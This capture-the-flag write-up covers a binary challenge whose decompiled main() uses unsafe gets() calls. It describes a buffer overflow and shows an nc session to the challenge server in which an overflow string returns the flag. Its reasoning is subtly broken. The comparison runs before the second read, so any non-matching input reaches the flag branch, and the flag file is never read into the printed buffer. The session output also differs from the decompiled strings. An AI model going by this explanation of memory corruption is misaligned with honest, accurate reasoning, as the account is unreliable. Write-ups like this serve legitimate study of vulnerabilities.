Challenge Description: 

The TV is supposed to be buffering. But it isn't doing that now. Strange.
Author: omelette_keychain

File(s) given: let-the-tv-buffer (ELF file)

1. Analyse the file with Ghidra. main() shows this:

    ```int main(void) {
        char local_68[70];
        char local_22[10];
        FILE *local_18;
        char *local_10;

        local_10 = "-3735928559";
        puts("The TV usually keeps buffering. It isn't doing that now for some reason. I dunno why :(");
        puts("I need to show my cool TV fixing skills for the upcoming science fair.");
        puts("I wonder what I can do to put it back to how it originally was... Any ideas? \nReply >> ");
        gets(local_22);

        if (strcmp(local_22, local_10) == 0) {
            puts("Hmm. It doesn't work. Nice try though! :)");
        } else {
            local_18 = fopen("flag.txt", "r");
            puts("The TV is back to buffering. Thanks!");
            puts("Wait. It is showing some sorta secret code...");

            if (local_18 == NULL) {
                printf("Error in opening the flag file. Flag file might be missing :(\n");
            }

            gets(local_68 + 0x3b); // potential buffer overflow vulnerability
            puts(local_68);
        }

        exit(0);
    }```

2. We can see this suspicious line ```gets(local_68 + 0x3b);```
local_68 is a buffer with 70 bytes, and 0x3b is 59 in decimal. So ```gets(local_68 + 0x3b)``` starts writing at byte 59, leaving only 11 bytes until the end of the buffer.

However, gets() reads an entire line of user input without any size limit, meaning if the user enters more than 11 bytes, it will overwrite memory beyond local_68. So we can tell that this challenge is about **buffer overflow**!

We also see that the condition for printing the flag is dependent on local_10 and local_22. local_10 already has a fixed value, but local_22 is just a buffer with 10 bytes. Hence we just need to make the strcmp() fail by corrupting local_22 to get the flag.

3. Since local_22 is just after local_68 in the main() function above, this means that we just need a payload that is more than 11 bytes long (11 to fill up local_68, and the rest to corrupt local_22). 
```└─$ nc 43.205.113.100 8370
    The TV usually keeps buffering. It isn't doing that now for some reason. I dunno why.
    I need to show my cool TV fixing skills for the upcoming science fair!
    I wonder what i can do to put it back to how it originally was... Any ideas? 
    Reply >> 
    AAAAAAAAAABBBBBBBB
    The TV is back to buffering! Thanks!
    ...wait. It is showing some sorta secret code.
    shaktictf{@nd_th@t's_h0w_th3_buff3r_0v3rfl0w3d_tv_c00k3d!}```
